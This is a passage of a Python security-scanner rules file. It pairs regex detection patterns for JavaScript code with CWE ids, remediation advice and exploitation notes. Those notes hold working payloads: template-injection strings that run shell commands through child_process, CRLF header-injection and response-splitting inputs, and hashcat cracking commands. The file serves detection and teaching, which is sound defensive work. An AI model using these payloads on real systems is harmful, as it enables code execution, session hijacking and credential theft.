- #{process.mainModule.require('child_process').execSync('id')}

NUNJUCKS:
- {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

HANDLEBARS (limited, but with helpers):
- {{#with "s" as |string|}}...{{/with}}

DETECTION:
- {{7*7}} -> 49 (math evaluation)
- ${7*7} -> 49
- #{7*7} -> 49
- <%= 7*7 %> -> 49""",
        remediation="Never pass user input as template string. Use template data context only."
    ),

    # -------------------------------------------------------------------------
    # LOGGING SENSITIVE DATA
    # -------------------------------------------------------------------------
    SecurityRule(
        id="LOG-001",
        name="Sensitive Data in Logs",
        pattern=r"console\.(log|info|warn|error|debug)\s*\([^)]*\b(password|secret|token|api_?key|credit_?card|ssn|cvv)\b",
        severity=Severity.MEDIUM,
        category="Information Disclosure",
        cwe_id="CWE-532",
        description="Sensitive data may be logged, exposing it in log files.",
        exploitation="""
EXPLOITATION:
1. Gain access to log files (path traversal, log viewer, etc.)
2. Search for sensitive patterns

LOG LOCATIONS:
- /var/log/app.log
- Application-specific log directories
- Cloud logging services (CloudWatch, Stackdriver)
- Browser console (client-side)

SEARCH FOR:
- Password, token, key, secret, credit, ssn patterns
- Base64 encoded credentials
- JSON with sensitive fields""",
        remediation="Redact sensitive fields before logging. Use structured logging with field filtering."
    ),

    # -------------------------------------------------------------------------
    # INSECURE CRYPTO
    # -------------------------------------------------------------------------
    SecurityRule(
        id="CRYPTO-001",
        name="Weak Cryptographic Algorithm",
        pattern=r"(createHash|createCipher)\s*\(\s*['\"]?(md5|sha1|des|rc4)['\"]?",
        severity=Severity.MEDIUM,
        category="Weak Cryptography",
        cwe_id="CWE-327",
        description="Weak cryptographic algorithm (MD5, SHA1, DES, RC4) in use.",
        exploitation="""
EXPLOITATION:
MD5/SHA1 for passwords:
- Use rainbow tables or hashcat for cracking
- hashcat -m 0 hash.txt wordlist.txt (MD5)
- hashcat -m 100 hash.txt wordlist.txt (SHA1)

MD5/SHA1 for integrity:
- Collision attacks allow creating malicious files with same hash
- Google's SHAttered attack demonstrated SHA1 collision

DES/RC4:
- Weak key space (DES)
- Statistical biases (RC4)
- Use modern cracking tools""",
        remediation="Use SHA-256/SHA-3 for hashing. Use AES-256-GCM for encryption. Use bcrypt/argon2 for passwords."
    ),
    SecurityRule(
        id="CRYPTO-002",
        name="Hardcoded Encryption Key/IV",
        pattern=r"(createCipheriv|createDecipheriv)\s*\([^)]*,\s*['\"][^'\"]{16,}['\"]",
        severity=Severity.HIGH,
        category="Weak Cryptography",
        cwe_id="CWE-321",
        description="Hardcoded encryption key or IV found.",
        exploitation="""
EXPLOITATION:
1. Extract the key/IV from source code
2. Use it to decrypt intercepted ciphertext

IF IV IS STATIC:
- Identical plaintexts produce identical ciphertexts
- Enables known-plaintext attacks on some modes

STEPS:
1. Identify the cipher and mode (AES-CBC, etc.)
2. Extract key and IV
3. Decrypt captured data using crypto library""",
        remediation="Generate keys securely. Use random IVs for each encryption. Store keys in secure key management."
    ),

    # -------------------------------------------------------------------------
    # HEADER INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="HEADER-001",
        name="HTTP Header Injection",
        pattern=r"(res\.set|res\.header|res\.setHeader|response\.setHeader)\s*\([^)]*(\+|`|\$\{|req\.|params\.)",
        severity=Severity.MEDIUM,
        category="Header Injection",
        cwe_id="CWE-113",
        description="User input in HTTP headers can allow header injection.",
        exploitation="""
EXPLOITATION:
Inject CRLF to add arbitrary headers:

PAYLOADS:
- value%0d%0aX-Injected: true
- value%0d%0a%0d%0a<html>body</html> (response splitting)
- value%0d%0aSet-Cookie: session=malicious

IMPACTS:
- XSS via injected HTML in response body
- Cache poisoning
- Session fixation via Set-Cookie injection

URL ENCODE:
- %0d = CR (\\r)
- %0a = LF (\\n)""",
        remediation="Validate/encode header values. Remove newlines from user input."
    ),
]


def get_rules_by_severity(severity: Severity) -> List[SecurityRule]:
    """Get all rules matching a specific severity."""
    return [r for r in SECURITY_RULES if r.severity == severity]


def get_rules_by_category(category: str) -> List[SecurityRule]:
    """Get all rules matching a specific category."""
    return [r for r in SECURITY_RULES if r.category.lower() == category.lower()]


def get_rule_by_id(rule_id: str) -> Optional[SecurityRule]:
    """Get a specific rule by ID."""
    for rule in SECURITY_RULES:
        if rule.id == rule_id:
            return rule
    return None


# Summary statistics
RULE_CATEGORIES = list(set(r.category for r in SECURITY_RULES))
TOTAL_RULES = len(SECURITY_RULES)

